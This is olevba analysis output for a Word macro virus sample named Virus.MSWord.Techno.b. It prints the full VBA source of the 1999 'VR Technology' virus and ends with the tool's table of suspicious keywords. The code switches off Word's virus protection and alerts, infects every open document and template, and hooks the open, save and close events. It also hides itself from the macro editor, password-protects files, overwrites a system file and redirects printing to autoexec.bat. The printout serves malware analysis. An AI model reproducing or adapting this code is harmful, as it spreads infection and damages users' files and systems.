olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Techno.b-8e05d263f2b24fc8c7be7423a9e9ad69c258b5a7
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Techno.b-8e05d263f2b24fc8c7be7423a9e9ad69c258b5a7 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO VrTechnoCode.bas 
in file: Virus.MSWord.Techno.b-8e05d263f2b24fc8c7be7423a9e9ad69c258b5a7 - OLE stream: 'Macros/VBA/VrTechnoCode'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
  '----------------------------------------------------------------'
  '  VR Òåõíîëîãèÿ v1.3 by John Great from Russia Far East (C)'99  '
  '----------------------------------------------------------------'

Const VrVersion As Single = 1.3
Const VrName As String = "VrTechnoCode"
Const VrMName As String = "VrTechnoCode": Const VrPassword As String = "Mirochka"

'-------------------'
'  Install-Module:  '
'-------------------'

Private Sub VrInstall(): On Error Resume Next
Application.EnableCancelKey = 0: Options.VirusProtection = 0
Application.DisplayAlerts = 0: WordBasic.DisableAutoMacros 0
Options.ConfirmConversions = 0: Options.SaveNormalPrompt = 0
ShowVisualBasicEditor = 0
If IsDestruct Then
    For Each aDoc In Documents: GoSub VrInfect: Next
    For Each aDoc In Templates: GoSub VrInfect: aDoc.Save: Next
    If IsChance(9) Then AddOemInfo
End If: Exit Sub
VrInfect:
    VrN = "": VrN = aDoc.CustomDocumentProperties("VrName")
    VrV = 0: VrV = aDoc.CustomDocumentProperties("VrVersion")
    If VrN = VrName Then
    If VrV >= VrVersion Then
    If aDoc.ProtectionType <> wdNoProtection Then aDoc.Unprotect VrPassword
    Return: End If: End If
    
    aDoc.CustomDocumentProperties.Add "VrName", False, msoPropertyTypeString, VrName
    aDoc.CustomDocumentProperties.Add "VrVersion", False, msoPropertyTypeFloat, VrVersion
    
    If aDoc = MacroContainer Then Return
    For Each mDoc In aDoc.VBProject.VBComponents: aDoc.VBProject.VBComponents.Remove (mDoc): Next
    VrFName = Application.Options.DefaultFilePath(wdProgramPath) & "\" + VrMName
    MacroContainer.VBProject.VBComponents(VrMName).Export (VrFName)
    aDoc.VBProject.VBComponents.Import (VrFName): Kill (VrFName)
    WordBasic.SetPrivateProfileString VrName, "Version", VrVersion, "win.ini"
    x = WordBasic.GetPrivateProfileString(VrName, "Install", "win.ini")
    WordBasic.SetPrivateProfileString VrName, "Install", CStr(IIf(x = "", 0, x) + 1), "win.ini"
    If (x <> 0) And (Int(x / 50) = x / 50) Then CreateImageScreen
Return: End Sub

Private Sub VrInstallFile(): On Error Resume Next
If IsDestruct Then Exit Sub
With Application.FileSearch
    .LookIn = CurDir
    .FileName = "*.Doc"
    .SearchSubFolders = False
ffound = .Execute
If ffound Then
For I = 1 To IIf(ffound < 4, ffound, 3)
Application.OrganizerCopy MacroContainer.FullName, .FoundFiles(Int(Rnd * ffound + 1)), VrMName, 3
Next: End If: End With: End Sub

'-------------------'
'  Infect-Module:   '
'-------------------'

'Îòêðûòü
Sub AutoOpen(): Call VrInstall: End Sub
Sub AutoExec(): Call VrInstall: End Sub

Sub FileOpen(): On Error Resume Next: WordBasic.DisableAutoMacros -1
If Dialogs(wdDialogFileOpen).Show Then VrInstall
End Sub
'Íîâûé äîêóìåíò
Sub FileNew(): Application.Documents.Add: VrInstall: End Sub
Sub FileNewDefault()
Application.Documents.Add Template:=NormalTemplate.FullName: Call VrInstall: End Sub
'Ñîõðàíèòü
Sub FileSaveAs(): On Error Resume Next: Application.DisplayAlerts = -2
If Dialogs(wdDialogFileSaveAs).Show Then
If Not (ActiveDocument.SaveFormat = 0 Or ActiveDocument.SaveFormat = 1) Then
VrFName = Application.Options.DefaultFilePath(wdProgramPath) & "\" + VrMName
MacroContainer.VBProject.VBComponents(VrMName).Export (VrFName)
ActiveDocument.VBProject.VBComponents.Import (VrFName)
Set mDoc = ActiveDocument.VBProject.VBComponents(VrMName & "1")
ActiveDocument.VBProject.VBComponents.Remove (mDoc)
Kill (VrFName): ActiveDocument.Protect 2, 0, VrPassword
ActiveDocument.SaveAs FileFormat:=0
End If: End If: Call VrInstall: End Sub
Sub FileSave(): On Error Resume Next
If ActiveDocument.Name <> ActiveDocument.FullName Then
ActiveDocument.Protect 2, 0, VrPassword
ActiveDocument.SaveAs FileFormat:=wdFormatDocument: Call VrInstall
Else: FileSaveAs: End If: End Sub
'Çàêðûòü
Sub FileClose(): On Error Resume Next
ActiveDocument.Protect 2, 0, VrPassword: Application.DisplayAlerts = -2
If ActiveDocument.Name = ActiveDocument.FullName Then
Call FileSaveAs
If ActiveDocument.Saved Then ActiveDocument.Close wdDoNotSaveChanges
Else: ActiveDocument.Close -2, 0: Call VrInstall: End If: End Sub
Sub DocClose(): On Error Resume Next: If IsChance(9) Then VrInstallFile
Call FileClose: End Sub

'-------------------'
'  Stealth-Module:  '
'-------------------'

Sub ViewVBCode(): VrStealth: End Sub
Sub ToolsMacro(): VrStealth: End Sub
Sub FileTemplates(): VrStealth: End Sub
Sub ToolsOptions(): On Error Resume Next
If Dialogs(wdDialogToolsOptions).Show Then
Options.SaveNormalPrompt = 0: Options.VirusProtection = 0
End If: End Sub

Private Sub VrStealth(): On Error Resume Next
Application.EnableCancelKey = 0: ShowVisualBasicEditor = 0
If IsChance(5) Then
With Assistant.NewBalloon
    .Animation = msoAnimationThinking
    .Button = msoButtonSetOK
    .Heading = "VR Òåõíîëîãèÿ v" & VrVersion
    .Text = "Word Macro ÂÈÐÓÑ!!!" & vbCr & "ÄÂÞÈ ÌÂÄ ÐÔ  © 1999"
    .Show
End With: End If: End Sub
Private Function IsChance(Num As Integer) As Boolean: On Error Resume Next
Randomize: IsChance = Not CBool(Int(Rnd * Num)): If Not IsDestruct Then IsChance = False
End Function

'-------------------'
' Destruct-Module:  '
'-------------------'

Private Function IsDestruct() As Boolean: On Error Resume Next
If WordBasic.GetPrivateProfileString(VrName, "Password", "win.ini") = VrPassword Then IsDestruct = 0 Else IsDestruct = True
End Function
Sub FilePrint(): On Error Resume Next: With Dialogs.Item(wdDialogFilePrint)
If IsChance(5) Then .FileName = "C:\autoexec.bat"
.Show: End With: End Sub
Sub FilePrintDefault(): On Error Resume Next
If IsChance(5) Then
Application.PrintOut FileName:="C:\autoexec.bat"
Else: If IsChance(7) Then Else ActiveDocument.PrintOut
End If: End Sub

Private Sub AddOemInfo(): On Error Resume Next
fn = WordBasic.GetPrivateProfileString("Paths", "WinDir", "C:\MsDos.sys") & "\System\OemInfo.ini"
Kill (fn): Open fn For Output As #1
Print #1, "[General]"
Print #1, "Manufacturer=ÄÂÞÈ ÌÂÄ ÐÔ"
Print #1, "Model=MS Word Âèðóñ"
Print #1, "[Support Information]"
Print #1, "Line1=Êîìïüþòåð çàðàæåí âèðóñîì: " + VrName
Print #1, "Line2="
Print #1, "Line3=Vr Technology"
Print #1, "Line4=John Great, ÄÂÞÈ ÌÂÄ ÐÔ - (C) '1999"
Close #1: End Sub

Private Sub CreateImageScreen(): On Error Resume Next
Application.ScreenUpdating = 0: Application.EnableCancelKey = wdCancelDisabled
If ActiveDocument.ProtectionType = wdNoProtection Then
x0 = (ActiveDocument.PageSetup.PageWidth - 410) / 2: y0 = ActiveDocument.PageSetup.TopMargin
Set aShape = ActiveDocument.Shapes.AddShape(msoShapeRoundedRectangle, x0, y0, 410, 130)
With aShape
.Fill.Visible = msoTrue
.Fill.ForeColor.RGB = RGB(255, 255, 255)
.Fill.Transparency = 0.5
.Fill.OneColorGradient msoGradientHorizontal, 4, 0.23
.ZOrder msoBringInFrontOfText
.TextFrame.TextRange.Select
With Selection
.LanguageID = wdEnglishUS
.ParagraphFormat.Alignment = wdAlignParagraphCenter
.Font.Bold = True: .Font.Italic = False
.Font.Name = "Times New Roman": .Font.Size = 20
.TypeText Text:="Microsoft Word Macro Virus"
.Font.Italic = True: .Font.Size = 14
.TypeText Text:=vbCr + "VrTechnoCode" + vbCr
.Font.Italic = False: .Font.Bold = False: .Font.Size = 10
.ParagraphFormat.Alignment = wdAlignParagraphLeft
.TypeText Text:="- Word 7.0" + vbCr + "- Stealth Technology" + vbCr + "- Infect Documents and Templates" + vbCr + vbCrLf
.ParagraphFormat.Alignment = wdAlignParagraphCenter
.Font.Italic = True: .Font.Bold = True: .Font.Size = 14
.TypeText Text:="Copyright by John Great from Russia Far East, Khabarovsk'1999"
End With: End With
With ActiveDocument.Shapes.AddShape(msoShapeExplosion1, x0 + 225, y0 + 25, 180, 72)
.IncrementRotation 180#
.Fill.Visible = msoTrue
.Fill.PresetGradient msoGradientHorizontal, 1, msoGradientFire
.ZOrder msoSendBehindText
.TextFrame.TextRange.Select
With Selection
.Font.Bold = True: .Font.Italic = True
.ParagraphFormat.Alignment = wdAlignParagraphCenter
.Font.Name = "Times New Roman": .Font.Size = 16
.TypeText Text:="Version " & VrVersion
End With
ActiveDocument.Shapes.Range(Array(aShape.Name, .Name)).Select
Selection.ShapeRange.Group.Select: ActiveDocument.UndoClear
End With: End If: Application.ScreenUpdating = -1: End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

